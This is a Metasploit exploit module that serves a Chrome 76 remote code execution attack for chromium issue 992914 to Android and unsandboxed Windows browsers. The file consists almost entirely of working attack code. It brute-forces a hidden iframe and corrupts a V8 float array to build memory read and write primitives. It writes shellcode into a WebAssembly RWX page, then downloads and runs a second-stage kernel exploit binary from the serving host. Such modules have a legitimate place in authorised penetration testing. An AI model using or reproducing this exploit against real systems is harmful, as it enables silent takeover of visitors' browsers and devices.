##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Chrome 76 Object.seal exploit',
      'Description'    => %q{
        Chrome stable exploit for chromium issue 992914
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
          'IstvÃ¡n Kurucsai', # exploit
          'AmesianX', # 32bit exploit
          'timwr', # metasploit module
        ],
      'References'     => [
          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=992914'],
          ['URL', 'https://github.com/exodusintel/Chrome-Issue-992914-Sealed-Frozen-Element-Kind-Type-Confusion-RCE-Exploit'],
          ['URL', 'https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/'],
          ['URL', 'https://github.com/AmesianX/Chrome_Issue992914'],
          ['URL', 'https://powerhacker.net/forum/security-research/377-chrome-issue-992914-32-bit-conversion-analysis-report'],
        ],
      'Targets'        => [
          [ 'Android armle',
            {
              'Platform' => ['android', 'linux'],
              'Payload'  => { 'Space' => 2048, },
              'Arch' => ARCH_ARMLE
            }
          ],
          [ 'Windows x86 --no-sandbox',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 12 2019'))
    register_advanced_options([
      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information during exploitation", false]),
    ])
  end

  def on_request_uri(cli, request)

    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$}
      print_status("[*] " + request.body)
      send_response(cli, '')
      return
    end

    print_status("Sending #{request.uri} to #{request['User-Agent']}")
    uripath = datastore['URIPATH'] || get_resource
    uripath += '/' unless uripath.end_with? '/'

    if request.uri =~ %r{/payload$}
      path = ::File.join Msf::Config.data_directory, 'exploits', 'CVE-2014-3153.bin'
      exploit_data = ::File.binread(path)

      # Substitute the exploit shellcode with our own
      space = 2048
      payload_encoded = payload.encoded
      exploit_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))

      # Apply the target config
      offsets = {
        'new_samsung'  => true,
        'iovstack'     => 2,
        'offset'       => 7380,
        'force_remove' => true,
      }
      config_buf = [
        offsets['new_samsung'] ? -1 : 0,
        offsets['iovstack'].to_i,
        offsets['offset'].to_i,
        offsets['force_remove'] ? -1 : 0,
      ].pack('I4')
      exploit_data.gsub!("c0nfig" + "\x00" * 10, config_buf)
      send_response(cli, exploit_data, {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good("Sent stage2 exploit #{exploit_data.length}")
    elsif request.uri =~ %r{/exploit$}
      path = ::File.join Msf::Config.data_directory, 'exploits', 'loader.armle'
      shellcode = ::File.binread(path)
      html = %Q^
<html>
<head>
<script>

#{ datastore['DEBUG_EXPLOIT'] ? "print = function(arg) {
  var request = new XMLHttpRequest();
  request.open('POST', '#{uripath}print', false);
  request.send('' + arg);
};
" : "" }

// HELPER FUNCTIONS
let conversion_buffer = new ArrayBuffer(16);
let float_view = new Float64Array(conversion_buffer);
let bint_view = new BigUint64Array(conversion_buffer);
let sint_view = new Uint32Array(conversion_buffer);
Number.prototype.float_to_high_32bit = function() {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] >> 32n) & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.float_to_low_32bit = function() {
    float_view[0] = this;
    bint_view[0] = bint_view[0] & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.setHighUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0x00000000ffffffffn) | (BigInt(val) << 32n);
    return float_view[0];
}
Number.prototype.setLowUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0xffffffff00000000n) | BigInt(val);
    return float_view[0];
}

var float_array;
var tarr;
var obj_addrof;
var view;

function exploit() {
    const o = {foo: 0x41414141};
    for (let i = 0; i < 15; i++) {
        o[i] = i+16;
    }

    // the first corruption target
    float_array = [0x41414141];

    // second corruption target
    tarr = new Uint32Array(2);
    tarr[0] = 0x31313131;
    tarr[1] = 0x32323232;

    view = new DataView(tarr.buffer);

    // object used to imlpement the addrof primitive
    obj_addrof = {'a': 0x31323334/2, 'b': 1};
    obj_addrof['b'] = obj_addrof;

    // build a NumberDictionary inside the FixedArray
    o[0] = 0x08;    // number of elements
    o[1] = 0;       // number of deleted elements
    o[2] = 0x08;    // capacity;
    o[3] = 0x32;    // max key/requires slow elements
    // first element of the NumberDictionary
    o[4] = 0;       // key
    o[5] = 0x4141;  // value
    o[6] = 0xc0;    // PropertyDesc

    Object.seal(o);

    const v12 = {foo: 0x42424242};
    Object.preventExtensions(v12);
    Object.seal(v12);

    const v18 = {foo: Object};
    v12.__proto__ = 0;

    o[0] = 0x4242;

    for (i = 0; i < o.length; i++) {
        print('PADDING');
    }

    delete o[1];

    for (i = 0; i < o.length; i++) {
        print('PADDING');
    }

    if (float_array[2] !== undefined) {
        print('PADDING');
        print('PADDING');

        window.top.postMessage('SUCCESS', '*');

        print('-------------------------------------------------------------');
        print('[BEFORE] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        print('[BEFORE] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));

        // tarr.byteLength
        float_array[3] = float_array[3].setHighUint32(0xC8C8);
        // tarr.length
        float_array[4] = float_array[4].setLowUint32(0xC8C8);
        // tarr.buffer
        // float_array[8] = float_array[8].setHighUint32(0x00400000n);
        // view.byteLength
        float_array[15] = float_array[15].setLowUint32(0xC8C8);

        print('-------------------------------------------------------------');
        print('[AFTER] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        print('[AFTER] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));
        print('-------------------------------------------------------------');
        print('[OOB] tarr.length: ' + tarr.length);
        print('[OOB] tarr.byteLength: ' + tarr.byteLength);
        print('-------------------------------------------------------------');
        print('[OOB] view.byteLength: ' + view.byteLength);
        print('-------------------------------------------------------------');

        for (i = 0; i < 20; i++) {
            print('[64bit][32bit_low ] float_array[' + (i).toString() + ']: ' + float_array[i].float_to_low_32bit().toString(16));
            print('[64bit][32bit_high] float_array[' + (i).toString() + ']: ' + float_array[i].float_to_high_32bit().toString(16));
        }

        return true;
    }

    return false;
}

function rce() {
    function get_wasm_func() {
        var importObject = {
            imports: { imported_func: arg => print(arg) }
        };
        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
        wasm_code = new Uint8Array(bc);
        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
        return wasm_mod.exports.exported_func;
    }

    const obj_prop_b_offset = 19;
    const tarr_buf_offset = 8;
    let memory = {
        addrof(o) {
            obj_addrof['b'] = o;
            return float_array[obj_prop_b_offset].float_to_low_32bit();
        },
    };

    var req = new XMLHttpRequest();
    req.open('GET', '#{uripath}payload', false);
    req.overrideMimeType('text\/plain; charset=x-user-defined');
    req.send(null);
    if (req.status != 200) {
      return;
    }
    let payload_size = req.responseText.length;
    let payload_array = new ArrayBuffer(payload_size);
    let payload8 = new Uint8Array(payload_array);
    for (let i = 0; i < req.responseText.length; i++) {
      payload8[i] = req.responseText.charCodeAt(i) & 0xff;
    }
    let payload_array_addr = memory.addrof(payload_array) + 15;
    print('payload addr: 0x' + payload_array_addr.toString(16));

    let wasm_func = get_wasm_func();
    // traverse the JSFunction object chain to find the RWX WebAssembly code page
    let wasm_func_addr = memory.addrof(wasm_func) - 1;
    print('wasm addr: 0x' + wasm_func_addr.toString(16));
    //--------------------------------------------------------------------------------------
    let original = float_array[tarr_buf_offset].float_to_high_32bit();
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(wasm_func_addr + 12);
    let sfi = view.getUint32(0, true) - 1;
    print('sfi: 0x' + sfi.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(sfi + 4);
    let WasmExportedFunctionData = view.getUint32(0, true) - 1;
    print('WasmExportedFunctionData: 0x' + WasmExportedFunctionData.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(payload_array_addr);
    let payload_data = view.getUint32(0, true);
    print('payload_data: 0x' + payload_data.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(WasmExportedFunctionData + 8);
    let instance = view.getUint32(0, true) - 1;
    print('instance: 0x' + instance.toString(16));
    //-------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(instance + 0x44);
    let rwx_addr = view.getUint32(0, true);
    print('rwx: 0x' + rwx_addr.toString(16));
    //--------------------------------------------------------------------------------------
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(rwx_addr);
    let shellcode = new Uint8Array([#{Rex::Text::to_num(shellcode)}]);
    for (let i = 0; i < shellcode.length; i++) {
        view.setUint8(i, shellcode[i]);
    }
    let b60 = view.getUint32(0x60, true);
    print('b60: 0x' + b60.toString(16));
    let b64 = view.getUint32(0x64, true);
    print('b64: 0x' + b64.toString(16));
    view.setUint32(0x60, payload_data, true);
    view.setUint32(0x64, payload_size, true);
    float_array[tarr_buf_offset] = float_array[tarr_buf_offset].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    // invoke the shellcode
    wasm_func();
}

function try_exploit() {
    for (let i=0;i<100;i++) {
        try {
            if (exploit()) {
                rce();
            }
        } catch {
            break;
        }
    }

    print('[!] Float array corruption unsuccessful, RESTARTING!');
    location.reload();
}

try_exploit();

</script>
</head>
</html>
^
      unless datastore['DEBUG_EXPLOIT']
        html.gsub!(/\/\/.*$/, '') # strip comments
        html.gsub!(/^\s*print\s*\(.*?\);\s*$/, '') # strip print(*);
      end
      send_response(cli, html, {'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      return
    end

    html = %Q^
<html>
    <head>
        <script>
            function iter() {
                let iframe = null;
                try {
                    iframe = document.getElementById('myframe');
                    document.body.removeChild(iframe);
                } catch (e) {}

                iframe = document.createElement('iframe');
                iframe.src = '#{uripath}exploit';
                iframe.id = 'myframe';
                iframe.style = "width:0; height:0; border:0; border:none; visibility=hidden"
                document.body.appendChild(iframe);
            }

            function brute() {
                iter();
                let interval = window.setInterval(iter, 2000);
                window.onmessage = function(e) {
                    if (e.data.includes('SUCCESS')) {
                        console.log('exploit successful!');
                        window.clearInterval(interval);
                    }
                }
            }
        </script>
    </head>
    <body onload="brute()"></body>
</html>
^
    send_response(cli, html, {'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
